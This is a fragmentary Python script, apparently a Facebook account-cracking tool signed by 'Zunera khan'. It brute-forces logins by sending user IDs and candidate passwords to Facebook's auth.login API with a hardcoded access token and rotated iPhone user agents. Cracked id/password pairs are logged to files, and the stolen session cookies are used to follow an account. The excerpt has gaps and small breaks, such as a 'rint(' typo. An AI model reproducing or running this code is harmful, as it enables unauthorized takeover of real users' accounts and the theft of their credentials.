...
def crack(idf,pwv):
	...
	fff = '%'
	sys.stdout.write('\r %s[Zunera] %s/%s | [OK] %s | [CP] %s  '%(bi,loop,len(id2),len(ok),cp)),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cp +=1
				print( f'\r\x1b[1;91m[Zunera-CP] {idf} * {pw}')
				...
				wrt =('%s - %s' % (idf,pw))
				ok.append(wrt)
				open('/sdcard/Zunera-CP.txt','a').write('%s\n' % wrt)
				follow(ses,coki)
				break
...
def free(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				rint( f'\r\x1b[1;92m [Successful-Zunera] {idf} * {pw}')
				...
				coki=po.cookies.get_dict()
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r\x1b[1;92m [Successful-Zunera] {idf} * {pw}')
				wrt =('%s - %s' % (idf,pw))
				ok.append(wrt)
				open('/sdcard/Successful-Zunera.txt','a').write('%s\n' % wrt)
				follow(ses,coki)
				break
...
.............. 01932804722 .............
\033[1;92m══════════════════════════════════════════════════
\33[1;32m𝔸𝕦𝕥𝕙𝕠𝕣   : Zunera khan
\33[1;32m𝔽𝕒𝕔𝕖𝕓𝕠𝕠𝕜 : Zunera khan   
\33[1;32m𝔾𝕚𝕥𝕙𝕦𝕓   : Zunera22
...
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/112.0.5615.46 Mobile/15E148 Safari/604.1",
...
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/112.0 Mobile/15E148 Safari/605.1.15",
		...
		sys.stdout.write(
			"\r [+]%s> /[Zunera]>%s -> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("Successful-Zunera.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[1;32m[Zunera Ok-Just Now] %s | %s\033[1;32m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("Zunera Ok-Just Now").write(" %s | %s\n"%(uid, pw))
				break
			else:
				continue
...
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/112.0 Mobile/15E148 Safari/605.1.15",
		...
		for pw in pwx:
			...
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[1;32m[Zunera Ok-Just Now ] %s | %s\033[0;32m         "%(uid, pw))
				print ("\r \033[1;32m Congrats ")
				self.ok.append("%s|%s"%(uid, pw))
				open("Zunera Ok-Just Now ","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[1;32m[Successful-Zunera] %s | %s\033[1;32m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("Successful-Zunera.txt","a").write(" %s | %s\n"%(uid, pw))
				break
			else:
